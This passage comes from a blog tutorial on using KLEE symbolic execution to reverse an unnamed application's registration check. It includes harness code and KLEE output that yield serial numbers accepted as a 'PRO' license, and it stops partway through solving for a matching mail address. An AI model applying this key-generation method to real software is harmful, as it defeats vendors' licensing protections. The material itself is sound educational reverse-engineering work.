</span></code></pre></td></tr></table></div></figure>


<p>But, cutting out code is not the only problem I&rsquo;ve found in this step. External constraints must be carefully considered. For example the <a href="http://www.cplusplus.com/reference/ctime/time/">time</a> function can be handled by KLEE itself. KLEE tries to generate useful values even from that function. This is good if we want to test bugs related to a strange current time, but in our case, since the code will be executed by the program <em>at a particular time</em>, we are only interested in the value provided at that time. We don&rsquo;t want KLEE traits this function as symbolic; we only want the right time value. To solve that problem, I have replaced all the calls to <code>time</code> to a <code>my_time</code> function, returning a fixed value, defined in the source code.</p>

<p>Another problem comes from the extraction of the functions from their outer context. Often code is written with <em>implicit conventions</em> in mind. These are not self-evident in the code because checks are avoided. A trivial example is the null terminator and valid ASCII characters in strings. KLEE does not assume those constraints, but the validation code does. This is because the GUI provides only valid strings. A less trivial example is that the mail address is always passed lowercase from the GUI to the lower level application logic. This is not self-evident if you do not follow every step from the user input to the actual computations with the data.</p>

<p>The solution to this latter problem is to provide those constraints to KLEE:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">char</span> <span class="n">mail</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
</span><span class='line'><span class="kt">char</span> <span class="n">c</span><span class="p">;</span>
</span><span class='line'><span class="n">klee_make_symbolic</span><span class="p">(</span><span class="n">mail</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mail</span><span class="p">),</span> <span class="s">&quot;mail&quot;</span><span class="p">);</span>
</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mail</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">c</span> <span class="o">=</span> <span class="n">mail</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span><span class='line'>    <span class="n">klee_assume</span><span class="p">(</span> <span class="p">(</span><span class="n">c</span> <span class="o">&gt;=</span> <span class="sc">&#39;0&#39;</span> <span class="o">&amp;</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="sc">&#39;9&#39;</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">c</span> <span class="o">&gt;=</span> <span class="sc">&#39;a&#39;</span> <span class="o">&amp;</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="sc">&#39;z&#39;</span><span class="p">)</span> <span class="o">|</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">&#39;\0&#39;</span> <span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="n">klee_assume</span><span class="p">(</span><span class="n">mail</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">mail</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;\0&#39;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Logical operators inside <code>klee_assume</code> function are bitwise and not logical (i.e. <code>&amp;</code> and <code>|</code> instead of <code>&amp;&amp;</code> and <code>||</code>) because they are simpler, since they do not add the extra branches required by lazy operators.</p>

<h2>Throw everything into KLEE</h2>

<p>Having extracted all the needed functions and global data and solved all the issues with the code, we can now move on and run KLEE with our brand new test program:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="err">$</span> <span class="n">clang</span> <span class="o">-</span><span class="n">emit</span><span class="o">-</span><span class="n">llvm</span> <span class="o">-</span><span class="n">g</span> <span class="o">-</span><span class="n">o</span> <span class="n">attempt1</span><span class="p">.</span><span class="n">ll</span> <span class="o">-</span><span class="n">c</span> <span class="n">attempt1</span><span class="p">.</span><span class="n">c</span>
</span><span class='line'><span class="err">$</span> <span class="n">klee</span> <span class="o">--</span><span class="n">optimize</span> <span class="o">--</span><span class="n">libc</span><span class="o">=</span><span class="n">uclibc</span> <span class="o">--</span><span class="n">posix</span><span class="o">-</span><span class="n">runtime</span> <span class="n">attempt1</span><span class="p">.</span><span class="n">ll</span>
</span></code></pre></td></tr></table></div></figure>


<p>And then wait for an answer.</p>

<p>And wait for another while.</p>

<p>Make some coffee, drink it, come back and watch the PC heating up.</p>

<p>Go out, walk around, come back, have a shower, and&hellip;. oh no! It&rsquo;s still running! OK, that&rsquo;s enough! Let&rsquo;s kill it.</p>

<h2>Deconstruction approach</h2>

<p>We have assumed too much from the tool. It&rsquo;s time to use the brain and ease its work a little bit.</p>

<p>Let&rsquo;s decompose the big picture of the registration check presented before piece by piece. We will try to solve it bit by bit, to reduce the solution space and so, the complexity.</p>

<p>Recall that the algorithm is composed by three main conditions:</p>

<ul>
<li>serial number must be valid by itself;</li>
<li>serial number, combined with mail address have to correspond to the actual customer number;</li>
<li>there has to be a correspondence between serial number and mail address, stored in a static table in the binary.</li>
</ul>


<p>Can we split them in different KLEE runs?</p>

<p>Clearly the first one can be written as:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;assert.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;klee/klee.h&gt;</span>
</span><span class='line'><span class="c1">// include all the functions extracted from the program</span>
</span><span class='line'><span class="cp">#include &quot;extracted_code.c&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">enum</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">ERROR</span><span class="p">,</span>
</span><span class='line'>    <span class="n">STANDARD</span><span class="p">,</span>
</span><span class='line'>    <span class="n">PRO</span>
</span><span class='line'><span class="p">}</span> <span class="n">license_type</span> <span class="o">=</span> <span class="n">ERROR</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">serial</span><span class="p">,</span> <span class="n">valid</span><span class="p">;</span>
</span><span class='line'>    <span class="n">klee_make_symbolic</span><span class="p">(</span><span class="o">&amp;</span><span class="n">serial</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">serial</span><span class="p">),</span> <span class="s">&quot;serial&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">license_type</span> <span class="o">=</span> <span class="n">get_license_type</span><span class="p">(</span><span class="n">serial</span><span class="p">);</span>
</span><span class='line'>    <span class="n">valid</span> <span class="o">=</span> <span class="p">(</span><span class="n">license_type</span> <span class="o">==</span> <span class="n">PRO</span><span class="p">);</span>
</span><span class='line'>    <span class="n">klee_assert</span><span class="p">(</span><span class="o">!</span><span class="n">valid</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>And let&rsquo;s see if KLEE can work with this single function:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="err">$</span> <span class="n">clang</span> <span class="o">-</span><span class="n">emit</span><span class="o">-</span><span class="n">llvm</span> <span class="o">-</span><span class="n">g</span> <span class="o">-</span><span class="n">o</span> <span class="n">serial_type</span><span class="p">.</span><span class="n">ll</span> <span class="o">-</span><span class="n">c</span> <span class="n">serial_type</span><span class="p">.</span><span class="n">c</span>
</span><span class='line'><span class="err">$</span> <span class="n">klee</span> <span class="o">--</span><span class="n">optimize</span> <span class="o">--</span><span class="n">libc</span><span class="o">=</span><span class="n">uclibc</span> <span class="o">--</span><span class="n">posix</span><span class="o">-</span><span class="n">runtime</span> <span class="n">serial_type</span><span class="p">.</span><span class="n">ll</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">ERROR</span><span class="o">:</span> <span class="o">/</span><span class="n">work</span><span class="o">/</span><span class="n">symbolic</span><span class="o">/</span><span class="n">serial_type</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">17</span><span class="o">:</span> <span class="n">ASSERTION</span> <span class="n">FAIL</span><span class="o">:</span> <span class="o">!</span><span class="n">valid</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'>
</span><span class='line'><span class="err">$</span> <span class="n">ls</span> <span class="n">klee</span><span class="o">-</span><span class="n">last</span><span class="o">/</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">err</span>
</span><span class='line'><span class="n">test000019</span><span class="p">.</span><span class="n">assert</span><span class="p">.</span><span class="n">err</span>
</span><span class='line'><span class="err">$</span> <span class="n">ktest</span><span class="o">-</span><span class="n">tool</span> <span class="o">--</span><span class="n">write</span><span class="o">-</span><span class="n">ints</span> <span class="n">klee</span><span class="o">-</span><span class="n">last</span><span class="o">/</span><span class="n">test000019</span><span class="p">.</span><span class="n">ktest</span>
</span><span class='line'><span class="n">ktest</span> <span class="n">file</span> <span class="o">:</span> <span class="err">&#39;</span><span class="n">klee</span><span class="o">-</span><span class="n">last</span><span class="o">/</span><span class="n">test000019</span><span class="p">.</span><span class="n">ktest</span><span class="err">&#39;</span>
</span><span class='line'><span class="n">args</span>       <span class="o">:</span> <span class="p">[</span><span class="err">&#39;</span><span class="n">serial_type</span><span class="p">.</span><span class="n">ll</span><span class="err">&#39;</span><span class="p">]</span>
</span><span class='line'><span class="n">num</span> <span class="n">objects</span><span class="o">:</span> <span class="mi">2</span>
</span><span class='line'><span class="n">object</span>    <span class="mi">0</span><span class="o">:</span> <span class="n">name</span><span class="o">:</span> <span class="err">&#39;</span><span class="n">model_version</span><span class="err">&#39;</span>
</span><span class='line'><span class="n">object</span>    <span class="mi">0</span><span class="o">:</span> <span class="n">size</span><span class="o">:</span> <span class="mi">4</span>
</span><span class='line'><span class="n">object</span>    <span class="mi">0</span><span class="o">:</span> <span class="n">data</span><span class="o">:</span> <span class="mi">1</span>
</span><span class='line'><span class="n">object</span>    <span class="mi">1</span><span class="o">:</span> <span class="n">name</span><span class="o">:</span> <span class="err">&#39;</span><span class="n">serial</span><span class="err">&#39;</span>
</span><span class='line'><span class="n">object</span>    <span class="mi">1</span><span class="o">:</span> <span class="n">size</span><span class="o">:</span> <span class="mi">4</span>
</span><span class='line'><span class="n">object</span>    <span class="mi">1</span><span class="o">:</span> <span class="n">data</span><span class="o">:</span> <span class="mi">102690141</span>
</span></code></pre></td></tr></table></div></figure>


<p>Yes! we now have a serial number that is considered PRO by our target application.</p>

<p>The third condition is less simple: we have a table in which are stored values matching mail addresses with serial numbers. The high level check is this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">check</span><span class="p">(</span><span class="kt">int</span> <span class="n">serial</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">mail</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">get_index_in_mail_table</span><span class="p">(</span><span class="n">serial</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">&gt;</span> <span class="n">HEADER_SIZE</span><span class="p">)</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">VALID_IF_LAST_VERSION</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">mail_digest</span> <span class="o">=</span> <span class="n">compute_mail_digest</span><span class="p">(</span><span class="n">mail</span><span class="p">);</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">mail_digest_table</span><span class="p">[</span><span class="n">index</span> <span class="o">+</span> <span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">mail_digest</span><span class="p">)</span>
</span><span class='line'>            <span class="k">return</span> <span class="n">VALID</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">INVALID</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This piece of code imposes constraints on our mail address and serial number, but not on the customer number. We can rewrite the checks in two parts, the one checking the serial, and the one checking the mail address:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">check_serial</span><span class="p">(</span><span class="kt">int</span> <span class="n">serial</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">mail</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">get_index_in_mail_table</span><span class="p">(</span><span class="n">serial</span><span class="p">);</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">valid</span> <span class="o">=</span> <span class="n">index</span> <span class="o">&lt;=</span> <span class="n">HEADER_SIZE</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">check_mail</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">mail</span><span class="p">,</span> <span class="kt">int</span> <span class="n">index</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">mail_digest</span> <span class="o">=</span> <span class="n">compute_mail_digest</span><span class="p">(</span><span class="n">mail</span><span class="p">);</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">mail_digest_table</span><span class="p">[</span><span class="n">index</span> <span class="o">+</span> <span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">mail_digest</span><span class="p">)</span>
</span><span class='line'>            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <code>check_mail</code> function needs the index in the table as secondary input, so it is not completely independent from the other check function. However, <code>check_mail</code> can be incorporated by our successful test program used before:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">// ...</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">serial</span><span class="p">,</span> <span class="n">valid</span><span class="p">,</span> <span class="n">index</span><span class="p">;</span>
</span><span class='line'>    <span class="n">klee_make_symbolic</span><span class="p">(</span><span class="o">&amp;</span><span class="n">serial</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">serial</span><span class="p">),</span> <span class="s">&quot;serial&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">license_type</span> <span class="o">=</span> <span class="n">get_license_type</span><span class="p">(</span><span class="n">serial</span><span class="p">);</span>
</span><span class='line'>    <span class="n">valid</span> <span class="o">=</span> <span class="p">(</span><span class="n">license_type</span> <span class="o">==</span> <span class="n">PRO</span><span class="p">);</span>
</span><span class='line'>    <span class="c1">// added just now</span>
</span><span class='line'>    <span class="n">index</span> <span class="o">=</span> <span class="n">get_index_in_mail_table</span><span class="p">(</span><span class="n">serial</span><span class="p">);</span>
</span><span class='line'>    <span class="n">valid</span> <span class="o">&amp;=</span> <span class="n">index</span> <span class="o">&lt;=</span> <span class="n">HEADER_SIZE</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">klee_assert</span><span class="p">(</span><span class="o">!</span><span class="n">valid</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>And if we run it, we get our revised serial number, that satisfies the additional constraint:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="err">$</span> <span class="n">clang</span> <span class="o">-</span><span class="n">emit</span><span class="o">-</span><span class="n">llvm</span> <span class="o">-</span><span class="n">g</span> <span class="o">-</span><span class="n">o</span> <span class="n">serial</span><span class="p">.</span><span class="n">ll</span> <span class="o">-</span><span class="n">c</span> <span class="n">serial</span><span class="p">.</span><span class="n">c</span>
</span><span class='line'><span class="err">$</span> <span class="n">klee</span> <span class="o">--</span><span class="n">optimize</span> <span class="o">--</span><span class="n">libc</span><span class="o">=</span><span class="n">uclibc</span> <span class="o">--</span><span class="n">posix</span><span class="o">-</span><span class="n">runtime</span> <span class="n">serial</span><span class="p">.</span><span class="n">ll</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">ERROR</span><span class="o">:</span> <span class="o">/</span><span class="n">work</span><span class="o">/</span><span class="n">symbolic</span><span class="o">/</span><span class="n">serial</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span> <span class="n">ASSERTION</span> <span class="n">FAIL</span><span class="o">:</span> <span class="o">!</span><span class="n">valid</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'>
</span><span class='line'><span class="err">$</span> <span class="n">ls</span> <span class="n">klee</span><span class="o">-</span><span class="n">last</span><span class="o">/</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">err</span>
</span><span class='line'><span class="n">test000032</span><span class="p">.</span><span class="n">assert</span><span class="p">.</span><span class="n">err</span>
</span><span class='line'><span class="err">$</span> <span class="n">ktest</span><span class="o">-</span><span class="n">tool</span> <span class="o">--</span><span class="n">write</span><span class="o">-</span><span class="n">ints</span> <span class="n">klee</span><span class="o">-</span><span class="n">last</span><span class="o">/</span><span class="n">test000019</span><span class="p">.</span><span class="n">ktest</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="n">object</span>    <span class="mi">1</span><span class="o">:</span> <span class="n">name</span><span class="o">:</span> <span class="err">&#39;</span><span class="n">serial</span><span class="err">&#39;</span>
</span><span class='line'><span class="n">object</span>    <span class="mi">1</span><span class="o">:</span> <span class="n">data</span><span class="o">:</span> <span class="mi">120300641</span>
</span><span class='line'><span class="p">...</span>
</span></code></pre></td></tr></table></div></figure>


<p>For those who are wondering if <code>get_index_in_mail_table</code> could return a negative index, and so possibly crash the program I can answer that they are not alone. <a href="https://twitter.com/0vercl0k">@0vercl0k</a> asked me the same question, and unfortunately I have to answer a no. I tried, because I am a lazy ass, by changing the assertion above to <code>klee_assert(index &lt; 0)</code>, but it was not triggered by KLEE. I then manually checked the function&rsquo;s code and I saw a beautiful <code>if (result &lt; 0) result = 0</code>. So, the answer is no! You have not found a vulnerability in the application :(</p>

<p>For the <code>check_mail</code> solution we have to provide the index of a serial, but wait&hellip; we have it! We have now a serial, so, computing the index of the table is simple as executing this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">get_index_in_mail_table</span><span class="p">(</span><span class="n">serial</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Therefore, given a serial number, we can solve the mail address in this way:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">// ...</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">serial</span><span class="p">,</span> <span class="n">valid</span><span class="p">,</span> <span class="n">index</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">mail</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// mail is symbolic</span>
</span><span class='line'>    <span class="n">klee_make_symbolic</span><span class="p">(</span><span class="n">mail</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mail</span><span class="p">),</span> <span class="s">&quot;mail&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mail</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">c</span> <span class="o">=</span> <span class="n">mail</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span><span class='line'>        <span class="n">klee_assume</span><span class="p">(</span> <span class="p">(</span><span class="n">c</span> <span class="o">&gt;=</span> <span class="sc">&#39;0&#39;</span> <span class="o">&amp;</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="sc">&#39;9&#39;</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">c</span> <span class="o">&gt;=</span> <span class="sc">&#39;a&#39;</span> <span class="o">&amp;</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="sc">&#39;z&#39;</span><span class="p">)</span> <span class="o">|</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">&#39;\0&#39;</span> <span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="n">klee_assume</span><span class="p">(</span><span class="n">mail</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">mail</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;\0&#39;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// get serial as external input</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span>
</span><span class='line'>        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>    <span class="n">serial</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// compute index</span>
</span><span class='line'>    <span class="n">index</span> <span class="o">=</span> <span class="n">get_index_in_mail_table</span><span class="p">(</span><span class="n">serial</span><span class="p">);</span>
</span><span class='line'>    <span class="c1">// check validity</span>
</span><span class='line'>    <span class="n">valid</span> <span class="o">=</span> <span class="n">check_mail</span><span class="p">(</span><span class="n">mail</span><span class="p">,</span> <span class="n">index</span><span class="p">);</span>
</span><span class='line'>    <span class="n">klee_assert</span><span class="p">(</span><span class="o">!</span><span class="n">valid</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We only have to run KLEE with the additional serial argument, providing the computed one by the previous step.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="err">$</span> <span class="n">clang</span> <span class="o">-</span><span class="n">emit</span><span class="o">-</span><span class="n">llvm</span> <span class="o">-</span><span class="n">g</span> <span class="o">-</span><span class="n">o</span> <span class="n">mail</span><span class="p">.</span><span class="n">ll</span> <span class="o">-</span><span class="n">c</span> <span class="n">mail</span><span class="p">.</span><span class="n">c</span>
</span><span class='line'><span class="err">$</span> <span class="n">klee</span> <span class="o">--</span><span class="n">optimize</span> <span class="o">--</span><span class="n">libc</span><span class="o">=</span><span class="n">uclibc</span> <span class="o">--</span><span class="n">posix</span><span class="o">-</span><span class="n">runtime</span> <span class="n">mail</span><span class="p">.</span><span class="n">ll</span> <span class="mi">120300641</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">ERROR</span><span class="o">:</span> <span class="o">/</span><span class="n">work</span><span class="o">/</span><span class="n">symbolic</span><span class="o">/</span><span class="n">mail</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">34</span><span class="o">:</span> <span class="n">ASSERTION</span> <span class="n">FAIL</span><span class="o">:</span> <span class="o">!</span><span class="n">valid</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="err">$</span> <span class="n">ls</span> <span class="n">klee</span><span class="o">-</span><span class="n">last</span><span class="o">/</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">err</span>
</span><span class='line'><span class="n">test000023</span><span class="p">.</span><span class="n">assert</span><span class="p">.</span><span class="n">err</span>
